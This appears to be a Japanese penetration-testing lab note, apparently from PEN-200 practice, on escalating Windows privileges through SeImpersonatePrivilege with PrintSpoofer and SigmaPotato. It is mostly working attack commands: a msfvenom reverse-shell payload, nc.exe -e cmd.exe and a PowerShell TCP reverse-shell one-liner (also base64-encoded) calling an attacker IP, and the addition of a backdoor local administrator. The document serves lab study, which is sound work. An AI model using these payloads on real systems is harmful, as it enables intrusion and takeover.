- SeImpersonatePrivilegeおよびPrint Spoolerサービスが有効であることから、Token Impersonationの技法でPE試行

# Token Impersonation

## PrintSpoofer

- 使用ツール：[PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

- ペイロードの用意
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.115 LPORT=4444 -f exe -o shell.exe
```
![[Pasted image 20260110103849.png]]

- ターゲットへの転送
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ python -m http.server 8888                                                  
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```
```powershell
*Evil-WinRM* PS C:\Users\r.andrews> iwr -uri http://192.168.49.115:8888/PrintSpoofer64
*Evil-WinRM* PS C:\Users\r.andrews> iwr -uri http://192.168.49.115:8888/shell.exe -OutFile.\shell.exe
```

- 実行
	- 失敗
	- [[r.andrews#システム情報]]より、OSがWindows 11 version 23H2であるため、対象外
```powershell
*Evil-WinRM* PS C:\Users\r.andrews> .\PrintSpoofer64.exe -i　-c ".\shell.exe" 
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.
```

## SigmaPotato

- 使用ツール：[SigmaPotato]

- ダウンロード
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ ls
PrintSpoofer64.exe  shell.exe  SigmaPotato.exe
```
```powershell
*Evil-WinRM* PS C:\Users\r.andrews> iwr -uri http://192.168.49.115:8888/SigmaPotato.exe -OutFile.\SigmaPotato.exe
```

- 実行
```powershell
*Evil-WinRM* PS C:\Users\r.andrews> .\SigmaPotato.exe ".\shell.exe"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 992 | Token: 0x736 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1076
[+] Current Command Length: 11 characters
[+] Creating Process via 'CreateProcessWithTokenW'
[+] Process Started with PID: 2200

[+] Process returned no output.
```

- nc.exeを使ってみる
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .  
```
```powershell
*Evil-WinRM* PS C:\Users\r.andrews> .\SigmaPotato.exe "nc.exe 192.168.49.115 4444 -e cmd.exe"
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 992 | Token: 0x736 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 1048
[+] Current Command Length: 37 characters
[+] Creating Process via 'CreateProcessWithTokenW'
[+] Process Started with PID: 3304

[+] Process returned no output.
```

- 念の為、リスナーを4444から443に変更してみる→**シェル獲得**
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ sudo rlwrap nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.49.115] from (UNKNOWN) [192.168.115.206] 57171
Microsoft Windows [Version 10.0.22631.3880]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>
```
![[Pasted image 20260110105258.png]]


- nc.exeで接続したこともあり、少し使いづらいので、獲得したシェルからpowershellワンライナーペイロードを実行する（ポート80でも失敗）
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.49.115',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
→失敗

- [Nishang - GitHub](https://github.com/samratashok/nishang)を使う
```zsh
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
```
```zsh
subl Invoke-PowerShellTcpOneLine.ps1
```
```powershell
# 変更前
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

# 変更後
$client = New-Object System.Net.Sockets.TCPClient('192.168.49.115',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```zsh
# エンコード
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26/Payloads]
└─$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
IwBBACAAcwBpAG0AcABsAGUAIABhAG4AZAAgAHMAbQBhAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwALgAgAE8AcAB0AGkAbwBuAHMAIABhAG4AZAAgAGgAZQBsAHAAIAByAGUAbQBvAHYAZQBkACAAdABvACAAcwBhAHYAZQAgAHMAcABhAGMAZQAuACAACgAjAFUAbgBjAG8AbQBtAGUAbgB0ACAAYQBuAGQAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABhAHIAZABjAG8AZABlAGQAIABJAFAAIABhAGQAZAByAGUAcwBzACAAYQBuAGQAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABpAG4AIAB0AGgAZQAgAGIAZQBsAG8AdwAgAGwAaQBuAGUALgAgAFIAZQBtAG8AdgBlACAAYQBsAGwAIABoAGUAbABwACAAYwBvAG0AbQBlAG4AdABzACAAYQBzACAAdwBlAGwAbAAuAAoAIwAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4AMgA1ADQALgAxACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKACMAJABzAG0APQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIANQA0AC4AMQAnACwANQA1ADUANQA1ACkAKQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAdAA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwBtAC4AUgBlAGEAZAAoACQAYgB0ACwAMAAsACQAYgB0AC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB0ACwAMAAsACQAaQApADsAJABzAHQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACkAKQA7ACQAcwBtAC4AVwByAGkAdABlACgAJABzAHQALAAwACwAJABzAHQALgBMAGUAbgBnAHQAaAApAH0ACgAKAA== 
```

- 実行→失敗
```powershell
powershell -enc "IwBBACAAcwBpAG0AcABsAGUAIABhAG4AZAAgAHMAbQBhAGwAbAAgAHIAZQB2AGUAcgBzAGUAIABzAGgAZQBsAGwALgAgAE8AcAB0AGkAbwBuAHMAIABhAG4AZAAgAGgAZQBsAHAAIAByAGUAbQBvAHYAZQBkACAAdABvACAAcwBhAHYAZQAgAHMAcABhAGMAZQAuACAACgAjAFUAbgBjAG8AbQBtAGUAbgB0ACAAYQBuAGQAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABhAHIAZABjAG8AZABlAGQAIABJAFAAIABhAGQAZAByAGUAcwBzACAAYQBuAGQAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABpAG4AIAB0AGgAZQAgAGIAZQBsAG8AdwAgAGwAaQBuAGUALgAgAFIAZQBtAG8AdgBlACAAYQBsAGwAIABoAGUAbABwACAAYwBvAG0AbQBlAG4AdABzACAAYQBzACAAdwBlAGwAbAAuAAoAIwAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADkAMgAuADEANgA4AC4AMgA1ADQALgAxACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKACMAJABzAG0APQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADIANQA0AC4AMQAnACwANQA1ADUANQA1ACkAKQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAdAA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwBtAC4AUgBlAGEAZAAoACQAYgB0ACwAMAAsACQAYgB0AC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB0ACwAMAAsACQAaQApADsAJABzAHQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACkAKQA7ACQAcwBtAC4AVwByAGkAdABlACgAJABzAHQALAAwACwAJABzAHQALgBMAGUAbgBnAHQAaAApAH0ACgAKAA=="
```

- batファイルに保存して、ターゲットに渡し、実行させてみる（これでダメならportを80に変えて、それでもダメならやめる）
```zsh
echo powershell -enc '<Base64エンコードされたペイロード>' > <filename>.bat
```

→できない

- AdministratorのPowerShellヒストリーは見えなくなるが、ユーザーを追加して、evil-winrmで列挙する
```powershell
.\SigmaPotato.exe "net user koshi Password123! /add"
.\SigmaPotato.exe "net localgroup Administrators koshi /add"
```
![[Pasted image 20260110113347.png]]

- rdp接続
```zsh
$ xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:192.168.115.206 /u:'koshi' /p:'Password123!'  
```
![[Pasted image 20260110113648.png]]